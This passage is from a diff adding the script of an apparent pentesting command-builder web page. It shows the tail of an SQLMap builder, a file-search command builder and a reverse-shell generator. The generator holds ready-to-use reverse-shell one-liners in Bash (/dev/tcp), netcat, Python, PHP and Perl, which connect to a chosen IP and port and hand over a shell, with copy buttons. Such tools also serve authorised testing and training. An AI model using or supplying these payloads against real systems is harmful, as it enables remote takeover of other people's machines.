+['sqlmap-url', 'sqlmap-data', 'sqlmap-cookies', 'sqlmap-options'].forEach(id => document.getElementById(id)?.addEventListener('input', buildSqlmap));
+document.getElementById('sqlmap-copy')?.addEventListener('click', () => safeCopy(document.getElementById('sqlmap-output').textContent, 'SQLMap copied!'));
+buildSqlmap();
+
+// ========== FIND ==========
+function buildFind() {
+  const os = document.getElementById('find-os').value;
+  const type = document.getElementById('find-type').value;
+  const val = document.getElementById('find-name').value.trim();
+  const opts = document.getElementById('find-options').value.trim();
+  if (os === 'linux') {
+    let cmd = `find / -type f`;
+    if (type === 'ext') { if (!val) { document.getElementById('find-output').textContent = '⚠️ Enter extension'; return; } const ext = val.startsWith('.') ? val.slice(1) : val; cmd += ` -name "*.${ext}"`; }
+    else if (type === 'exact') { if (!val) { document.getElementById('find-output').textContent = '⚠️ Enter filename'; return; } cmd += ` -name "${val}"`; }
+    else if (type === 'size') { if (!val) { document.getElementById('find-output').textContent = '⚠️ Enter size'; return; } cmd += ` -size ${val}`; }
+    else if (type === 'perm') { if (!val) { document.getElementById('find-output').textContent = '⚠️ Enter permissions'; return; } cmd += ` -perm ${val}`; }
+    if (opts) cmd += ` ${opts}`;
+    cmd += ` 2>/dev/null`;
+    document.getElementById('find-output').textContent = cmd;
+  } else {
+    let cmd = '';
+    if (type === 'all') cmd = 'dir C:\\ /s /b';
+    else if (type === 'ext') { if (!val) { document.getElementById('find-output').textContent = '⚠️ Enter extension'; return; } const ext = val.startsWith('.') ? val.slice(1) : val; cmd = `dir C:\\*.${ext} /s /b`; }
+    else if (type === 'exact') { if (!val) { document.getElementById('find-output').textContent = '⚠️ Enter filename'; return; } cmd = `dir C:\\${val} /s /b`; }
+    else cmd = '# Size/perm filters not supported on Windows';
+    if (opts && !cmd.startsWith('#')) cmd += ` ${opts}`;
+    document.getElementById('find-output').textContent = cmd;
+  }
+}
+['find-os', 'find-type', 'find-name', 'find-options'].forEach(id => document.getElementById(id)?.addEventListener('input', buildFind));
+document.getElementById('find-copy')?.addEventListener('click', () => safeCopy(document.getElementById('find-output').textContent, 'Find copied!'));
+buildFind();
+
+// ========== REVERSE SHELLS ==========
+const shellTemplates = [
+  { name: 'Bash -i', cmd: 'bash -i >& /dev/tcp/{ip}/{port} 0>&1' },
+  { name: 'Netcat (nc -e)', cmd: 'nc {ip} {port} -e /bin/sh' },
+  { name: 'Netcat Traditional', cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f' },
+  { name: 'Python', cmd: "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
+  { name: 'PHP', cmd: "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
+  { name: 'Perl', cmd: "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" }
+];
+function renderShellList() {
+  const term = (document.getElementById('rs-search')?.value || '').toLowerCase();
+  const list = document.getElementById('rs-list');
+  list.innerHTML = '';
+  shellTemplates.filter(t => t.name.toLowerCase().includes(term)).forEach(t => {
+    const div = document.createElement('div');
+    div.className = 'template-item';
+    div.textContent = t.name;
+    div.onclick = () => generateShell(t);
+    list.appendChild(div);
+  });
+}
+function generateShell(t) {
+  const ip = document.getElementById('rs-ip').value.trim() || 'LHOST';
+  const port = document.getElementById('rs-port').value.trim() || 'LPORT';
+  const cmd = t.cmd.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
+  document.getElementById('rs-payload').textContent = cmd;
+}
+document.getElementById('rs-ip')?.addEventListener('input', () => renderShellList());
+document.getElementById('rs-port')?.addEventListener('input', () => renderShellList());
+document.getElementById('rs-search')?.addEventListener('input', renderShellList);
+document.getElementById('rs-copy')?.addEventListener('click', () => safeCopy(document.getElementById('rs-payload').textContent, 'Payload copied!'));
+renderShellList();
+
+// Navbar & Utilities
+window.addEventListener('scroll', () => document.getElementById('navbar').classList.toggle('scrolled', window.scrollY > 20));
+const menuBtn = document.getElementById('menuBtn'), navLinksEl = document.getElementById('navLinks');
+menuBtn.addEventListener('click', () => navLinksEl.classList.toggle('open'));
+function updateLiveTime() { const el = document.getElementById('liveTime'); if (el) el.textContent = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }); }
+updateLiveTime(); setInterval(updateLiveTime, 1000);
+const video = document.getElementById('bgVideo'); if (video) video.play().catch(() => document.body.addEventListener('click', () => video.play(), { once: true }));
+</script>
+</body>
+</html>
